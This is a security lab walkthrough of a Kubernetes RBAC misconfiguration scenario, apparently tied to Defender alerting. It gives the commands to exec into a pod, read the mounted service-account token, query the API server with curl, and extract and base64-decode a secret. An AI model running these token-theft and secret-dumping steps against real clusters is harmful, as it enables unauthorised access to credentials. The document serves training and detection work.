# RBAC least privileges misconfiguration

In this scenario, we will see how simple misconfiguration like this can gain access to secrets, more resources, and information

We commonly see in the real world where developers and DevOps teams tend to provide extra privileges than required. This provides attackers more control and privileges than they intended to be. In this scenario, you can leverage the service account bound to the pod to provide webhookapikey access, but using this attacker can gain control over other secrets and resources

### Pod to work on: 
hunger-check
### Micconfiguration:
This deployment has a custom ServiceAccount mapped with an overly permissive policy/privilege. As an attacker, we can leverage this to gain access to other resources and services

### The goal: Find the Kubernetes secret k8svaultapikey by exploiting the RBAC privileges to complete this scenario

Run the following command using the name of your hunger-check-pod which runs ion the big-monolith namespace

```
kubectl get pods -n big-monolith
```

```
kubectl exec -n big-monolith -it <name-of-your-hunger-check-pod> -- /bin/bash
```

This deployment has a custom ServiceAccount mapped with an overly permissive policy/privilege. As an attacker, we can leverage this to gain access to other resources and services

By default the Kubernetes stores all the tokens and service accounts information in the default place, navigate to there to find the useful information

```
cd /var/run/secrets/kubernetes.io/serviceaccount/
```

```
ls -larth
```

Now we can use this information to query and talk to the Kubernetes API service with the available permissions and privileges
lets export some variables to be used to query the API server

```
export APISERVER=https://${KUBERNETES_SERVICE_HOST}
```
```
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
```
```
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
```
```
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
```
```
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
```
```
export CACERT=${SERVICEACCOUNT}/ca.crt
```

Now we can explore the Kubernetes API with the token and the constructed queries

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api
```

To query the available secrets in the default namespace run the following command

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets
```

To query the secrets specific to the namespace

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets
```

To query the pods in the specific namespace

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/pods
```

Get the k8svaulapikey value from the secrets

```
curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets | grep k8svaultapikey 
```

We can decode the base64 encoded value using the following command

```
echo "azhzLWdvYXQtODUwNTc4NDZhODA0NmEyNWIzNWYzOGYzYTI2NDlkY2U=" | base64 -d
```

Soon you will be able to see the Defender alerts showing up in the portal

![rbac-1](/images/rbac-1.png)

![rbac-2](/images/rbac-2.png)